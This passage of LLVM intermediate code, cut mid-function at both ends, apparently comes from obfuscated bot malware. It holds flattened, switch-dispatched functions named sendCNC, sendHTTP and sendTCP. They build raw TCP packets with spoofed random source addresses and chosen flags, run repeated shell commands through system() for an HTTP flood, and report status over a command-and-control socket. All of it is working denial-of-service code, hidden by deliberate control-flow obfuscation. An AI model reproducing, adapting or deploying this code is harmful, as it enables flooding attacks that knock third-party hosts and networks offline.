  %245 = trunc i32 %.reload13 to i16
  %246 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %247 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.2* %247 to %struct.anon.3*
  %249 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %248, i32 0, i32 1
  store i16 %245, i16* %249, align 2
  %250 = call i32 @rand_cmwc()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 3
  store i16 %251, i16* %253, align 4
  %254 = load i32, i32* %22, align 4
  %255 = call i32 @getRandomIP(i32 %254)
  %256 = call i32 @htonl(i32 %255) #13
  %257 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 8
  store i32 %256, i32* %258, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %259 = bitcast i8* %.reload6 to i16*
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 2
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = call zeroext i16 @csum(i16* %259, i32 %263)
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 7
  store i16 %264, i16* %266, align 2
  %267 = load i32, i32* %27, align 4
  %268 = load i32, i32* %14, align 4
  %269 = icmp eq i32 %267, %268
  %270 = select i1 %269, i32 -2078223023, i32 551680790
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %26, align 4
  %274 = icmp sgt i32 %272, %273
  %275 = select i1 %274, i32 1532861622, i32 -1230459949
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 -1594132489, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 1447325353, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %27, align 4
  %280 = add i32 %279, 1
  store i32 %280, i32* %27, align 4
  store i32 1447325353, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %282)
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %281, %278, %277, %276, %271, %244, %239, %237, %224, %223, %198, %193, %191, %151, %145, %144, %140, %135, %130, %129, %126, %120, %117, %112, %111, %108, %107, %106, %101, %97, %93, %82, %72, %71, %63, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %switchVar = alloca i32
  store i32 1711318906, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1711318906, label %22
    i32 -815245707, label %27
    i32 -512074943, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  %26 = select i1 %25, i32 -815245707, i32 -512074943
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %28, i32* %8, align 4
  %29 = load i32, i32* %8, align 4
  %30 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 16)
  %32 = call i32 @sleep(i32 1)
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  store i32 1711318906, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %27, %22, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %9, %10
  store i32 %11, i32* %5, align 4
  %12 = call i32 @rand() #2
  %13 = sext i32 %12 to i64
  %14 = urem i64 %13, 23
  %15 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %14
  %16 = load i8*, i8** %15, align 8
  store i8* %16, i8** %7, align 8
  %17 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %18 = bitcast i8** %17 to i8*
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %21 = bitcast i8** %20 to i8*
  %22 = load i8*, i8** %7, align 8
  %23 = call i8* @strcat(i8* %21, i8* %22) #2
  %24 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %25 = bitcast i8** %24 to i8*
  %26 = call i8* @strcat(i8* %25, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %27 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %28 = bitcast i8** %27 to i8*
  %29 = load i8*, i8** %3, align 8
  %30 = call i8* @strcat(i8* %28, i8* %29) #2
  %switchVar = alloca i32
  store i32 -1275738889, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1275738889, label %31
    i32 931444827, label %36
    i32 -372851011, label %59
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %5, align 4
  %33 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %34 = icmp sgt i32 %32, %33
  %35 = select i1 %34, i32 931444827, i32 -372851011
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = call i32 @rand() #2
  %38 = sext i32 %37 to i64
  %39 = urem i64 %38, 23
  %40 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  store i8* %41, i8** %7, align 8
  %42 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %43 = bitcast i8** %42 to i8*
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* %43, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %45 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %46 = bitcast i8** %45 to i8*
  %47 = load i8*, i8** %7, align 8
  %48 = call i8* @strcat(i8* %46, i8* %47) #2
  %49 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %50 = bitcast i8** %49 to i8*
  %51 = call i8* @strcat(i8* %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %52 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %53 = bitcast i8** %52 to i8*
  %54 = load i8*, i8** %3, align 8
  %55 = call i8* @strcat(i8* %53, i8* %54) #2
  %56 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %57 = bitcast i8** %56 to i8*
  %58 = call i32 @system(i8* %57)
  store i32 -1275738889, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %31, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -399750847, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -399750847, label %first
    i32 -2121874565, label %31
    i32 -1751904645, label %35
    i32 -185364019, label %40
    i32 1026133667, label %46
    i32 -1077924250, label %47
    i32 -563972031, label %54
    i32 1563289148, label %57
    i32 1867549204, label %63
    i32 -670789601, label %66
    i32 1145684087, label %70
    i32 333506437, label %71
    i32 93806197, label %77
    i32 -768835051, label %125
    i32 -1942196051, label %161
    i32 -513831094, label %164
    i32 -1310711053, label %168
    i32 -2069176252, label %173
    i32 -592653577, label %181
    i32 1348510404, label %186
    i32 -1290701750, label %194
    i32 1656878630, label %199
    i32 -1959334589, label %207
    i32 -1088809699, label %212
    i32 731557471, label %220
    i32 1503092546, label %225
    i32 -656177471, label %233
    i32 1919606423, label %237
    i32 1717554395, label %238
    i32 1742386828, label %239
    i32 -1054989193, label %240
    i32 -107742108, label %241
    i32 -122374900, label %243
    i32 -1793006555, label %244
    i32 -651501941, label %262
    i32 -821214927, label %264
    i32 -108607863, label %269
    i32 -1332382653, label %293
    i32 -1802167360, label %294
    i32 37498815, label %341
    i32 1858699708, label %346
    i32 482155102, label %347
    i32 -1883641364, label %348
    i32 -2010361980, label %351
    i32 561798387, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 -2121874565, i32 -1751904645
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -185364019, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -185364019, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 1026133667, i32 -1077924250
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 561798387, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1563289148, i32 -563972031
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  store i32 561798387, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 1867549204, i32 -670789601
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  store i32 561798387, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 1145684087, i32 333506437
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 93806197, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 93806197, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @getRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 -1942196051, i32 -768835051
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 -1793006555, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 -513831094, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 -1310711053, i32 -122374900
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -592653577, i32 -2069176252
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -107742108, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -1290701750, i32 1348510404
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 -1054989193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 -1959334589, i32 1656878630
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 1742386828, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 731557471, i32 -1088809699
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 1717554395, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 -656177471, i32 1503092546
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 1919606423, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i32 0, i32 0), i8* %235)
  store i32 1919606423, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1717554395, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1742386828, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 -1054989193, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -107742108, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 -513831094, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 -1793006555, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
